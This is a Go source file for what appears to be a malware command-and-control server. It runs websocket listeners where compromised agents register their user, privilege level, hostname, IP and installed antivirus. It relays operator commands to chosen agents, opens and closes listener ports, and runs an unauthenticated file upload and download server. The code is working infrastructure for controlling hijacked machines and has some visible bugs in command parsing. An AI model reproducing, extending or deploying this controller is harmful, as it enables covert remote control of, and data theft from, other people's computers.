package main

import (
	"bufio"
	"errors"
	"fmt"
	"io"
	"log"
	"net/http"
	"os"
	"strconv"
	"strings"
	"time"

	gophersocket "github.com/whiterabb17/gopher-socket"
	"github.com/whiterabb17/gopher-socket/transport"
	"github.com/whiterabb17/greatwhite/modules/models"
	"github.com/whiterabb17/greatwhite/modules/util"
	"gorm.io/gorm"
)

var (
	MainServer   *gophersocket.Server
	MainChannel  *gophersocket.Channel
	ChannelRooms []string
	userMap      map[string]string
	NodeFarm     []*Node
)

var (
	subscribe   = make(chan (chan<- Subscription), 10)
	unsubscribe = make(chan (<-chan Event), 10)
	publish     = make(chan Event, 10)
)

// Event is to define the event
type Event struct {
	EvtType   string
	User      string
	Timestamp int
	Text      string
}

type Node struct {
	Name     string
	Port     string
	Server   *gophersocket.Server
	MainRoom string
	Channel  *gophersocket.Channel
}

type NodeDB struct {
	Name      string `json:"name"`
	Port      string `json:"port"`
	MainRoom  string `json:"mainroom"`
	ChannelID string `json:"channelid"`
}

// Subscription is to manage subscribe events
type Subscription struct {
	Archive []Event
	New     <-chan Event
}

// Message is the data structure of messages
type Message struct {
	User      string `json:"user"`
	Timestamp int    `json:"timestamp"`
	Message   string `json:"message"`
}
type MyEventData struct {
	Data string
}

var newMessages chan string

func FindChannel(id string) (*gophersocket.Channel, error) {
	return MainServer.GetChannel(id)
}

func SendToChannel(channel *gophersocket.Channel, event string, message MyEventData) {
	channel.Emit(event, message)
}

func SendAck(channel *gophersocket.Channel, ackEvent string, message MyEventData) (result string, err error) {
	result, err = channel.Ack(ackEvent, message, time.Second*5)
	return
}

func BroadCastToAll(event string, message MyEventData) {
	MainServer.BroadcastToAll(event, message)
}

func BroadCastToRoom(room, event string, message MyEventData) {
	//or for clients joined to room
	MainServer.BroadcastTo(room, event, message)
}

func writeLog(cid, logmsg string) {
	_, e := os.ReadDir("Data")
	if e != nil {
		os.Mkdir("Data", 0644)
	}
	_, e = os.ReadDir("Data/" + cid)
	if e != nil {
		os.Mkdir("Data/"+cid, 0644)
	}
	f, err := os.OpenFile("Data/"+cid+"/operations.log",
		os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
	if err != nil {
		log.Println(err)
	}
	defer f.Close()
	f.WriteString(logmsg + "\n")
}

func CreateMainNode(name string, port string) *Node {
	//ChannelRooms = append(ChannelRooms, "garden")
	ChannelRooms = append(ChannelRooms, "default")
	MainServer = gophersocket.NewServer(transport.GetDefaultWebsocketTransport())
	log.Println("Creating Administration Node")
	node := &Node{
		Name:     "Lair",
		Port:     "55556",
		Server:   MainServer,
		MainRoom: "garden",
		Channel:  nil,
	}
	//create server instance, you can setup transport parameters or get the default one
	//look at websocket.go for parameters description
	return node
}
func CreateNode(name string, port string) *Node {
	server := gophersocket.NewServer(transport.GetDefaultWebsocketTransport())
	log.Println("Creating New Node")
	node := &Node{
		Name:     name,
		Port:     port,
		Server:   server,
		MainRoom: "default",
		Channel:  nil,
	}

	//create server instance, you can setup transport parameters or get the default one
	//look at websocket.go for parameters description
	userMap = make(map[string]string)
	return node
}
func ServeMaster(master *Node) {
	MainServer.On(gophersocket.OnConnection, func(c *gophersocket.Channel, args interface{}) {
		nodedb := &NodeDB{
			Name:      master.Name,
			Port:      master.Port,
			MainRoom:  "garden",
			ChannelID: c.Id(),
		}
		coloums := []string{"name", "port", "mainroom", "channelid"}
		log.Println(coloums)
		log.Println(nodedb)
		models.WriteStructToDB(nodedb)
		//client id is unique
		master.Channel = c
		log.Println("New Admin connected, Admin id is ", c.Id()+" \n\n\n")
		if len(models.Network) > 0 {
			log.Println("There are open listeners!")
			var portStr string
			for _, item := range models.Network {
				portStr += item.Name + "@" + strconv.Itoa(item.Port) + "|"
			}
			log.Println(portStr)
			c.Emit("portmap", &models.Packet{Event: "portmap", Message: portStr})
		}
		MainChannel = c
	})
	type NecroMessage struct {
		Message  string `json:"message"`
		Time     string `json:"time"`
		UserID   string `json:"userId"`
		UserName string `json:"userName"`
	}
	MainServer.On("necro", func(c *gophersocket.Channel, args NecroMessage) {
		log.Println("Recieved NecroDroid message")
		log.Println(args)
		fmt.Printf("Attempting to map Necro Message fields\n\nMessage: %s\nTime: %s\nUserID: %s\nUserName: %s", args.Message, args.Time, args.UserID, args.UserName)
		var cmd, client, arg1, arg2 string
		if args.Message == "clientsPlease" {
			log.Println(ChannelRooms)
			chans := DefaultCNode.List(ChannelRooms[0])
			log.Println(chans)
			var chanIds string
			for _, ch := range chans {
				chanIds += ch.Id() + "\n"
			}
			c.Emit("repl", models.Resp{Resp: chanIds, Tag: "TeamServer"})
		}
		if strings.Contains(args.Message, " ") {
			client = strings.Split(args.Message, " ")[0]
			cmd = strings.Split(args.Message, " ")[1]
			arg1 = strings.Split(args.Message, " ")[2]
			arg2 = strings.Split(args.Message, " ")[3]
		}
		channel := getChannelByTag(client)
		channel.Emit("necro", models.ToClient{Command: cmd, Data: arg1 + "!" + arg2, Tag: client})
	})
	MainServer.On("file", func(c *gophersocket.Channel, file models.Mail) {
		log.Println("Recieving File")
		fileData, err := util.FileF64(file.Buffer, file.Uid)
		if err != nil {
			c.Emit("error", models.Resp{Resp: err.Error(), Tag: "File Upload"})
		}
		log.Println(fileData)
	})
	MainServer.On(gophersocket.OnDisconnection, func(c *gophersocket.Channel, args interface{}) {
		//client id is unique
		log.Println("Admin with ID " + c.Id() + " has disconnected \n\n\n")
	})
	MainServer.On("log", func(c *gophersocket.Channel, packet models.Packet) {
		//client id is unique
		log.Println(packet)
	})
	MainServer.On("reqList", func(c *gophersocket.Channel) {
		log.Println(ServerList)
		ret := "ClientList\n"
		for k, v := range ServerList {
			ret += fmt.Sprintf("ClientName: %s		ClientID: %s\n", k, v)
		}
		log.Println(ret)
		c.Emit("clients", models.Packet{Event: "ClientList", Message: ret})
	})
	MainServer.On("sendToClient", func(c *gophersocket.Channel, toClient models.ToClient) {
		//log.Println(toClient)
		log.Println("To Send: \nReciever: " + toClient.Tag + "\nCommand: " + toClient.Command + " \nData: " + toClient.Data)
		cChan := getChannelByTag(toClient.Tag)
		cc, er := FindChannel(toClient.Tag)
		if er != nil {
			log.Println(er)
		}
		cc.Emit("necro", models.Packet{Event: toClient.Command, Message: toClient.Data})
		//cChan.Emit("necro", models.Resp{Resp: toClient.Data, Tag: toClient.Tag})
		cChan.Emit("necro", models.Packet{Event: toClient.Command, Message: toClient.Data})
	})
	MainServer.On("portmap", func(c *gophersocket.Channel, packet models.Packet) {
		//log.Println(toClient)
		if len(models.Network) > 0 {
			log.Println("There are open listeners!")
			var portStr string
			for _, item := range models.Network {
				portStr += item.Name + "@" + strconv.Itoa(item.Port) + "|"
			}
			log.Println(portStr)
			c.Emit("portmap", &models.Packet{Event: "portmap", Message: portStr})
		}
	})
	MainServer.On("newListener", func(c *gophersocket.Channel, message models.Packet) {
		log.Println("Starting a new listener on: " + message.Message + " \n\n\n")
		//nodePtr := CreateNode(message.Event, message.Message)
		res := ServeNode(message.Event, message.Message)
		if res.Error() == "reserved" {
			c.Emit("listener", models.Packet{Event: "reserved", Message: "reserved"})
		}
		det := message.Event + ":" + message.Message
		c.Emit("listener", models.Packet{Event: "started", Message: det})
	})
	serveMux := http.NewServeMux()
	serveMux.Handle("/socket.io/", MainServer)
	log.Println("Starting Admin Relay \n\n\n")
	log.Println(http.ListenAndServe(":55556", serveMux))
	//}
}
func getChannelByTag(tag string) (chn *gophersocket.Channel) {
	for _, ch := range models.Agents {
		if ch.Name == tag {
			return ch.Channel
		}
	}
	return
}

var Nodes []*Node
var DefaultCNode *gophersocket.Server
var ServerList map[string]string

func ServeNode(name string, port string) error {
	server := gophersocket.NewServer(transport.GetDefaultWebsocketTransport())
	DefaultCNode = server
	if len(Nodes) > 0 {
		for _, a := range Nodes {
			if a.Port == port {
				return errors.New("reserved")
			}
		}
	}
	log.Println("Creating New Node")
	node := &Node{
		Name:     name,
		Port:     port,
		Server:   server,
		MainRoom: "default",
		Channel:  nil,
	}
	Nodes = append(Nodes, node)
	ServerList = make(map[string]string)
	func() {
		for {
			//server := gophersocket.NewServer(transport.GetDefaultWebsocketTransport())
			// --- caller is default handlers
			server.On("reg", func(c *gophersocket.Channel, rep models.Resp) {
				log.Println(rep)
				MainChannel.Emit("reg", rep)
				writeLog(c.Id(), rep.Resp)

			})
			server.On("pws", func(c *gophersocket.Channel, rep models.Resp) {
				log.Println(rep)
				MainChannel.Emit("pws", rep)
			})
			//on connection handler, occurs once for each connected client
			server.On(gophersocket.OnConnection, func(c *gophersocket.Channel, args interface{}) {
				ChannelRooms[0] = "default"
				node.Channel = c
				// nodedb := &NodeDB{
				// 	Name:      node.Name,
				// 	Port:      node.Port,
				// 	MainRoom:  ChannelRooms[0],
				// 	ChannelID: c.Id(),
				// }
				// var coloums []string
				// coloums = append(coloums, "name", "port", "mainroom", "channelid")
				// models.WriteStructToDB(coloums, nodedb)
				//client id is unique
				log.Println("New client connected, client id is ", c.Id())
				//newMessages = make(chan string)
				userMap[c.Ip()] = c.Id()
				//you can join clients to rooms
				log.Println("Joining new client to " + ChannelRooms[0])
				c.Join(ChannelRooms[0])
				writeLog(c.Id(), "Initial Connection\n\n")
			})
			server.On("repl", func(c *gophersocket.Channel, reply models.Resp) {
				var rec string
				log.Println("Recieved Reply Message")
				if trns, er := util.Fb64(reply.Resp); er != nil {
					rec = reply.Resp
				} else {
					rec = trns
				}
				insDb := &models.Resp{
					Resp: rec,
					Tag:  c.Id(),
				}
				models.WriteStructToDB(insDb)
				fmt.Println(rec)
				newMessages <- reply.Resp
				writeLog(c.Id(), reply.Resp)
				MainChannel.Emit("repl", models.Resp{Resp: reply.Resp, Tag: reply.Tag})
			})
			server.On("register", func(c *gophersocket.Channel, info models.ClientInfo) {
				log.Println("Client is registering")
				cinfo := &models.ClientInfo{
					SocketID:  c.Id(),
					Priv:      info.Priv,
					Version:   info.Version,
					IPAddr:    info.IPAddr,
					Hostname:  info.Hostname,
					User:      info.User,
					OS:        info.OS,
					Arch:      info.Arch,
					CPU:       info.CPU,
					GPU:       info.GPU,
					Memory:    info.Memory,
					AntiVirus: info.AntiVirus,
					Lang:      info.Lang,
				}
				log.Println(cinfo)
				//MainChannel.Emit("register", cinfo)
				res := models.ReadFromDB("user", info.User)
				if errors.Is(res.Error, gorm.ErrRecordNotFound) {
					ins := models.WriteToDB(cinfo)
					if !errors.Is(ins.Error, gorm.ErrRecordNotFound) {
						log.Println("Clients Info was registered successfully")
					}
				} else {
					up := models.UpdateDBVals("ip_addr", info.IPAddr)
					if errors.Is(up.Error, gorm.ErrRecordNotFound) {
						log.Println("Error updating clients IP")
					}
					up = models.UpdateDBVals("priv", info.Priv)
					if errors.Is(up.Error, gorm.ErrRecordNotFound) {
						log.Println("Error updating the clients SocketID")
					}
					up = models.UpdateDBVals("socket_id", info.SocketID)
					if !errors.Is(up.Error, gorm.ErrRecordNotFound) {
						log.Println("Clients Info was updated successfully")
					}
				}
				toSend := fmt.Sprintf("%s#%s#Golang", info.SocketID, info.OS)
				log.Println(toSend)
				MainChannel.Emit("reg", models.Resp{Resp: toSend, Tag: c.Id()})
				newAgent := &models.Agent{
					Name:    c.Id(),
					Info:    cinfo,
					Channel: c,
				}
				ServerList[c.Id()] = cinfo.User
				toSend2 := cinfo.SocketID + "\n" + cinfo.IPAddr + "\n" + cinfo.Hostname + "\n" + cinfo.Version + "\n" + cinfo.User + "\n" + cinfo.Priv + "\n" + cinfo.OS + "\n" + cinfo.CPU + "\n" + cinfo.GPU + "\n" + cinfo.Memory + "\n" + cinfo.Lang
				models.Agents = append(models.Agents, newAgent)
				MainChannel.Emit("notify", models.Resp{Resp: toSend2, Tag: c.Id()})
				MainChannel.Emit("register", cinfo)
				writeLog(c.Id(), cinfo.SocketID+"\n"+cinfo.IPAddr+"\n"+cinfo.Hostname+"\n"+cinfo.Version+"\n"+cinfo.User+"\n"+cinfo.Priv+"\n"+cinfo.OS+"\n"+cinfo.CPU+"\n"+cinfo.GPU+"\n"+cinfo.Memory+"\n"+cinfo.Lang)
				//				models.ClientList = append(models.ClientList, cinfo)
				//
			})
			//on disconnection handler, if client hangs connection unexpectedly, it will still occurs
			//you can omit function args if you do not need them
			//you can return string value for ack, or return nothing for emit
			server.On(gophersocket.OnDisconnection, func(c *gophersocket.Channel) {
				//caller is not necessary, client will be removed from rooms
				//automatically on disconnect
				//but you can remove client from room whenever you need to
				log.Printf("Client %s has disconnected\nRemoving them from %s", c.Id(), ChannelRooms[0])
				c.Leave(ChannelRooms[0])

				if _, found := userMap[c.Ip()]; found {
					delete(userMap, c.Ip())
				}

				log.Println("Disconnection Handle Complete")
				MainChannel.Emit("discon", models.Resp{Resp: fmt.Sprintf("Client %s has disconnected", c.Id()), Tag: c.Id()})

				writeLog(c.Id(), "###################\n\nClient Disconnected\n\n############################")
			})
			server.On("error", func(c *gophersocket.Channel, resp models.Resp) {
				response, err := util.Fb64(resp.Resp)
				if err != nil {
					response = resp.Resp
				}
				tag, err := util.Fb64(resp.Tag)
				if err != nil {
					tag = resp.Tag
				}
				log.Println(resp)
				MainChannel.Emit("error", models.Resp{Resp: tag + "::" + (fmt.Sprintf("<u>Error Encountered</u>\nReponse: <i>%s</i>", response)), Tag: c.Id()})
				writeLog(c.Id(), "Error occurred\n\n"+response)
			})
			//error catching handler
			server.On(gophersocket.OnError, func(c *gophersocket.Channel) {
				log.Println("Error occurs")
			})

			// --- caller is custom handler
			/*
				//custom event handler
				server.On("handle something", func(c *gophersocket.Channel, channel Channel) string {
					log.Println("Something successfully handled")

					//you can return result of handler, in caller case
					//handler will be converted from "emit" to "ack"
					return "result"
				})
			*/
			//setup http server like caller for handling connections
			serveMux := http.NewServeMux()
			serveMux.Handle("/socket.io/", server)
			//go localListen(node.Channel)
			log.Println(http.ListenAndServe(":"+node.Port, serveMux))
		}
	}()
	return nil
}

// func localListen(c *gophersocket.Channel) {
// 	time.Sleep(10 * time.Second)
// 	for {
// 		fmt.Print("-> ")
// 		OS := bufio.NewScanner(os.Stdin)
// 		OS.Scan()
// 		if OS.Text() != "" {
// 			log.Println(OS.Text())
// 			switch OS.Text() {
// 			case "rcount":
// 				rooms := MainServer.Amount("admindefault")
// 				log.Println("Writing to DB")
// 				pkt := &models.Packet{
// 					Event:   "Room Count",
// 					Message: strconv.Itoa(rooms),
// 				}
// 				network.WriteToGeneralDB(pkt)
// 				log.Printf("Currently there are " + strconv.Itoa(rooms) + " rooms")
// 				//c.Emit("roomcount", MyEventData{strconv.Itoa(rooms)})
// 			case "chans":
// 				chans := MainServer.List("admindefault")
// 				var ret string
// 				for _, s := range chans {
// 					ret = ret + s.Id() + "\n\n"
// 				}
// 				log.Println(ret)
// 				//c.Emit("chanlist", MyEventData{ret})
// 				pkt := &models.Packet{
// 					Event:   "Channel Rooms",
// 					Message: ret,
// 				}
// 				network.WriteToGeneralDB(pkt)
// 			}
// 			c.Emit("repl", MyEventData{OS.Text()})
// 		}
// 		time.Sleep(5 * time.Second)
// 	}
// }

func uploader(w http.ResponseWriter, r *http.Request) {
	// Maximum upload of 10 MB files
	r.ParseMultipartForm(10 << 20)

	// Get handler for filename, size and headers
	file, handler, err := r.FormFile("myFile")
	if err != nil {
		fmt.Println("Error Retrieving the File")
		fmt.Println(err)
		return
	}

	defer file.Close()
	fmt.Printf("Uploaded File: %+v\n", handler.Filename)
	fmt.Printf("File Size: %+v\n", handler.Size)
	fmt.Printf("MIME Header: %+v\n", handler.Header)

	// Create file
	dst, err := os.Create("static/" + handler.Filename)
	if err != nil {
		http.Error(w, err.Error(), http.StatusInternalServerError)
		return
	}
	defer dst.Close()
	// Copy the uploaded file to the created file on the filesystem
	if _, err := io.Copy(dst, file); err != nil {
		http.Error(w, err.Error(), http.StatusInternalServerError)
		return
	}

	fmt.Fprintf(w, "Successfully Uploaded File\n")
}

func main() {
	go func() {
		http.HandleFunc("/upload", uploader)

		fs := http.FileServer(http.Dir("./static"))
		http.Handle("/files/", http.StripPrefix("/files", fs))

		log.Print("Static File Server serving files from Port: 60000...")
		err := http.ListenAndServe(":60000", nil)
		if err != nil {
			log.Println(err)
		}
	}()
	userMap = make(map[string]string)
	log.Println("Creating Main Node")
	go mainexec()
	for {
		fmt.Print("-> ")
		Addr := bufio.NewScanner(os.Stdin)
		Addr.Scan()
		var cmd string
		var tget string
		var args string
		log.Println(Addr.Text())
		if Addr.Text() != "" {
			if strings.Contains(Addr.Text(), " ") {
				cmd = strings.Split(Addr.Text(), " ")[0]
				tget = strings.Split(Addr.Text(), " ")[1]
				args = strings.Split(Addr.Text(), " ")[2]
			}
			switch cmd {
			case "getclients":
				log.Println(ChannelRooms)
				chans := DefaultCNode.List(ChannelRooms[0])
				log.Println(chans)
			case "getchan":
				cchans, errr := DefaultCNode.GetChannel(tget)
				if errr != nil {
					log.Println(errr)
				}
				log.Println(cchans)
			case "printAgentInfo":
				log.Println(models.Agents)
			case "showNodes":
				log.Println(Nodes)
			case "send":
				target := strings.Replace(tget, "to::", "", 1)
				cchan, err := DefaultCNode.GetChannel(target)
				if err != nil {
					log.Println(err)
				} else {
					log.Println(args)
					evt := strings.Split(args, "|")[0]
					vars := strings.Split(args, "|")
					out := &models.ToClient{Command: vars[1], Data: vars[2], Tag: target}
					log.Println(out)
					cchan.Emit(evt, out)
				}
			case "listener":
				switch tget {
				case "start":
					vars := strings.Split(args, "@")
					go ServeNode(vars[0], vars[1])
				// if res != nil {
				// 	log.Println(res)
				// }
				case "stop":
					for _, n := range Nodes {
						if n.Port == args {
							n.Channel.Close()
							MainChannel.Emit("listener", models.Packet{Event: "listener", Message: fmt.Sprintf("Port %s Closed", n.Port)})
							log.Printf("Port %s Closed", n.Port)
						}
					}
				}
			}
			time.Sleep(3 * time.Second)
		}
	}
}

func mainexec() {
	svr := CreateMainNode("admin", "55556")
	log.Println("Applying Handlers to the Server instance")
	func() {
		ServeMaster(svr)
	}()
}
